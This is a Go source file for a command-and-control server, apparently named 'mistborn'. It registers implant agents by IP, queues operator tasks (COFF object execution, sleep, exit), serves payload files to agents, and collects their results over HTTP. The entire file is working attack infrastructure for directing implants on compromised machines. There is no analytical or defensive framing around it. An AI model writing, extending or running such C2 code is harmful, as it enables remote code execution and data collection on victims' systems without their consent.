package main

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	pkg "mistborn.c2/m/v2/internal"
)

var TaskTypes = map[string]uint32{
	"coff":  1,
	"sleep": 2,
	"exit":  3,
}

var taskChannel = make(chan pkg.Task, 100)   // Channel for new tasks
var resultChannel = make(chan pkg.Task, 100) // Channel for task results

func main() {
	db, err := pkg.NewDb("db.json")
	if err != nil {
		panic(err)
	}
	defer db.Close()

	go syncTasksToDB(db) // Background goroutine for syncing tasks to DB

	r := gin.New()
	r.Use(gin.Recovery())

	clientRoutes := r.Group("/client")
	clientRoutes.GET("/all-agents", func(c *gin.Context) {
		agents, _ := db.GetAllAgents()
		c.JSON(http.StatusOK, agents)
	})
	clientRoutes.GET("/status/:id", func(c *gin.Context) {
		taskID := c.Param("id")
		task, err := db.GetTaskByID(taskID)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
			return
		}
		c.JSON(http.StatusOK, gin.H{
			"task_id":  task.ID,
			"finished": task.Finished,
			"result":   string(task.Result),
		})
	})

	r.GET("/register", func(c *gin.Context) {
		id, _ := pkg.GenerateRandomID(3)
		p1, _ := pkg.GenerateRandomID(6)
		p2, _ := pkg.GenerateRandomID(6)
		agent := pkg.Agent{
			ID:       id,
			Name:     p1 + "-" + p2,
			Host:     c.ClientIP(),
			IsActive: true,
		}

		oldAgent, err := db.GetAgentByHost(c.ClientIP())
		if err != nil {
			_ = db.AddAgent(&agent)
			c.Data(http.StatusOK, "application/octet-stream", []byte(id))
		} else {
			c.Data(http.StatusOK, "application/octet-stream", []byte(oldAgent.ID))
		}
	})

	r.POST("/queue", func(c *gin.Context) {
		var task pkg.Task
		if err := c.ShouldBindJSON(&task); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid task data"})
			return
		}

		task.CreatedAt = time.Now()
		err := db.AddTask(&task) // Add task directly to the database
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to add task"})
			return
		}
		taskChannel <- task
		c.JSON(http.StatusOK, gin.H{"status": "Task added"})
	})

	r.GET("/agent", func(c *gin.Context) {
		agent, _ := db.GetAgentByHost(c.ClientIP())
		task, err := db.GetOldestTaskByAgentID(agent.ID)
		if err != nil {
			c.Data(http.StatusOK, "application/octet-stream", []byte{})
			return
		}

		buf := []byte{}
		buf = append(buf, []byte(task.ID)...)
		buf = pkg.BufferAddUint32(buf, TaskTypes[task.TaskType])

		if task.FilePath != "" {
			fID, _ := pkg.GenerateRandomID(3)
			task.FileID = fID
			buf = pkg.BufferAddString(buf, fID)
			if task.TaskType == "coff" && len(task.Args) > 0 {
				buf = pkg.BufferAddString(buf, task.Args)
			}
		} else if task.TaskType == "sleep" {
			i, _ := strconv.Atoi(task.Args)
			buf = pkg.BufferAddUint32(buf, uint32(i))
		}
		c.Data(http.StatusOK, "application/octet-stream", buf)
	})

	r.POST("/file", func(c *gin.Context) {
		data, _ := c.GetRawData()
		pack := pkg.Package{Buffer: data, Length: uint32(len(data))}
		packReader := pkg.NewPackageReader(&pack)
		id, _ := packReader.GetString()

		task, err := db.GetTaskByID(id)
		println(task.ID, task.FilePath)
		if err != nil {
			c.Status(http.StatusNotFound)
			return
		}

		if task.FilePath != "" {
			buf, _ := os.ReadFile(task.FilePath)
			c.Data(http.StatusOK, "application/octet-stream", buf)
		}
	})

	r.POST("/result", func(c *gin.Context) {
		data, _ := c.GetRawData()
		pack := pkg.Package{Buffer: data, Length: uint32(len(data))}
		packReader := pkg.NewPackageReader(&pack)
		taskId, _ := packReader.GetString()
		res, _ := packReader.GetString()

		task, err := db.GetTaskByID(taskId)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
			return
		}

		task.Result = []byte(res)
		task.Finished = true
		resultChannel <- *task

		c.JSON(http.StatusOK, gin.H{"status": "Result received"})
	})

	fmt.Println("Booting server...")
	r.Run(":8000") // Run on port 8000
}

// Periodically syncs task results from memory to the database
func syncTasksToDB(db *pkg.DB) {
	for {
		select {
		case task := <-taskChannel:
			_ = db.AddTask(&task)
		case result := <-resultChannel:
			_ = db.FinishTask(result.ID, string(result.Result))
		}
	}
}
